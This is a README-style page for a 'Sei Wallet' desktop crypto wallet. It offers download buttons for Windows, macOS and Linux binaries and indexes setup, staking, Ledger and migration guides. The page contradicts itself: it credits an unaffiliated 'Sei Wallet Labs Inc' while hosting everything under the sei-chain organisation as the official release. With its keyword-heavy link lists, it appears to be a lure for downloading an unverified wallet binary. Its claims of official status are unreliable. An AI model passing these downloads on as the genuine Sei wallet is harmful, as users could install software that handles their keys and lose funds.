![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-hub.png)

<h1 align="center">Sei Wallet guides</h1>

<p align="center">Setup, staking and security guides for the Sei desktop wallet.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

## What this repository covers

Sei Wallet is a non-custodial desktop wallet for Sei, built by Sei Wallet Labs Inc and distributed for Windows, macOS and Linux. It signs `0x` transactions natively, keeps a read-only view of legacy `sei1` addresses, stakes and unbonds inside the app, and connects to a Ledger when you want the keys to stay on the device.

This repository is the index for every Sei Wallet guide. It is also where the questions that are not really about a button live: whether the wallet is safe to use, how self-custody changes what you are responsible for, how seed-phrase scams work, which hardware devices the app supports and what each one needs, and how the desktop app compares with an extension like Keplr or Rabby.

The guides are grouped by what you are trying to do rather than by product feature, so a reader who has just sent SEI to the wrong place and a reader choosing a hardware wallet both land on something useful within one click. Every guide is written to be read without the app open, and each one ends with the related guides that cover the next question people usually ask.

Start with the safety guide if you are deciding whether to use the wallet at all. Start with the scam guide if anyone has contacted you offering help, recovery or a fix, because that conversation is the single most common way a self-custody balance is lost, and it almost always begins with someone volunteering assistance you did not ask for.

## Safety

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) | What self-custody protects, what it does not, and what stays unverified. |
| [Sei Wallet: Seed phrase safety and the support scams around Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/seed-phrase-scams-and-fake-support.md) | How the phrase is taken, how fake support works, and how to check a claim. |

</div>

## Hardware wallets

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md) | Connect the device, confirm the address on it, and stake from cold keys. |
| [Sei Wallet: Hardware wallets that work with SEI and Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/which-hardware-devices-work.md) | Which devices the app supports today, and what each one needs. |
| [Sei Wallet: Blind signing when Sei Wallet uses a Ledger](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md) | What blind signing shows, why it exists, and when to slow down. |
| [Sei Wallet: Why a Ledger shows a different Sei address in Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/why-the-device-shows-another-address.md) | Two derivation paths, two addresses, one account behind both. |

</div>

## Comparisons

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: Keplr](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md) | An extension and a desktop app, compared on custody, staking and reach. |
| [Sei Wallet: Rabby](https://github.com/sei-chain/sei-wallet-help/blob/main/rabby-compared-with-a-desktop-app.md) | An EVM-first extension beside a Sei-first desktop wallet. |

</div>

## Setup and migration

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: How to create a Sei wallet and what the setup asks for](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md) | Set up an account, write the phrase down, and fund it only after that. |
| [Sei Wallet: Importing an existing wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md) | Bring an existing phrase across and confirm the address before moving funds. |
| [Sei Wallet: How to verify a Sei Wallet download](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-verify-a-download-before-installing.md) | Check the file you downloaded against the published SHA-256 before you run it. |
| [Sei Wallet: sei1 and 0x addresses in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) | One account, two address forms, and which one to hand to whom. |
| [Sei Wallet: Where to find your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md) | Where the receive screen keeps the address, and how to check it is right. |
| [Sei Wallet: Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) | Move a balance out of Compass and confirm it arrived on the other side. |
| [Sei Wallet: Moving SEI from Keplr to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md) | Send from Keplr to the desktop app without losing track of the address form. |
| [Sei Wallet: Migrating SEI from Leap Wallet to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md) | Recreate the account in the desktop app, or send the balance across instead. |
| [Sei Wallet: Moving SEI out of Trust Wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) | Get SEI out of Trust Wallet and into an account you can stake from. |
| [Sei Wallet: Withdrawing SEI from an exchange to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md) | Withdraw to the right network and address form, with the memo if it is asked. |
| [Sei Wallet: The Sei memo field and exchange deposits into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) | When a memo is required, what happens without it, and who can help. |
| [Sei Wallet: Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) | Add the Sei network to MetaMask, and know what it still cannot do. |
| [Sei Wallet: Adding Sei to Trust Wallet, or holding it in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/configure-the-network-in-trust.md) | Set the network up in Trust Wallet, or hold SEI where staking works. |
| [Sei Wallet: Sei in Rabby, Phantom and other EVM wallets, or in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/use-rabby-phantom-or-a-desktop-app.md) | What Rabby and Phantom show for SEI, and where the difference matters. |
| [Sei Wallet: Chain ID 1329 and the Sei network settings in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md) | Chain ID 1329, the Pacific mainnet settings, and when you need them. |
| [Sei Wallet: RPC endpoints for Sei Wallet and what they change](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md) | What an RPC endpoint does, and what changing it can and cannot fix. |
| [Sei Wallet: Sei testnet, the faucet and test coins in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/testnet-faucet-and-test-coins.md) | Run the testnet beside mainnet and get test coins without risking real SEI. |
| [Sei Wallet: Is Sei EVM compatible, and what that means for Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md) | What EVM compatibility means for a SEI holder using a desktop wallet. |
| [Sei Wallet: A desktop Sei Wallet or a browser extension](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md) | Two ways to hold SEI, and the trade each one makes in practice. |

</div>

## Staking and transactions

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) | Delegate from the app, keep a liquid reserve, and pick a validator on evidence. |
| [Sei Wallet: Staking rewards not showing in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/rewards-not-showing-up.md) | Where rewards actually accrue, and why the balance can look unchanged. |
| [Sei Wallet: Unstaking SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md) | Why the exit takes 21 days, what a stuck unstake means, and what to do. |
| [Sei Wallet: Sei gas fees and what Sei Wallet shows before you sign](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md) | What the fee line means, why it is paid in SEI, and how to set. |
| [Sei Wallet: USDC and other tokens in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md) | Which tokens the app holds, how they differ from SEI, and what to check. |
| [Sei Wallet: Bridging SEI from Ethereum into Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md) | Bridge from Ethereum, then confirm which chain and which address received it. |
| [Sei Wallet: An IBC transfer pending on its way to Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/ibc-transfer-keeps-pending.md) | Why an IBC transfer sits pending, and what is and is not in your control. |
| [Sei Wallet: A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) | Tell a queued transfer from a failed one, then act on the right one. |
| [Sei Wallet: A failed Sei Wallet transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) | Read the error, find the cause, and stop repeating the same attempt. |
| [Sei Wallet: Sent SEI to the wrong address from Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md) | What is recoverable, what is not, and who genuinely cannot help. |
| [Sei Wallet: Reading a Sei block explorer beside Sei Wallet activity](https://github.com/sei-chain/sei-wallet-staking/blob/main/read-a-block-explorer.md) | Read a Sei explorer beside the app and confirm what actually happened. |

</div>

## More guides

- [Sei Wallet setup guides](https://github.com/sei-chain/sei-wallet-setup/blob/main/README.md)
- [Sei Wallet staking guides](https://github.com/sei-chain/sei-wallet-staking/blob/main/README.md)

---

## About

Sei Wallet is a non-custodial desktop wallet for Sei on Windows, macOS and Linux, built by Sei Wallet Labs Inc, which states no affiliation with Sei Labs or the Sei Foundation. Every guide here is written from the current release and Sei's own documentation; where a figure is a network parameter rather than a constant, the guide says so and points you at the app.

**Sei Wallet is non-custodial: the operator cannot move, freeze or recover your funds, which also means nobody can undo a transfer you sign.**

This repository's guides are published under the Apache-2.0 licence, the same one the application uses. The licence text sits in `LICENSE` at the repository root.

[Main repository](https://github.com/sei-chain/sei-wallet) - [Release v6.6.2](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2)
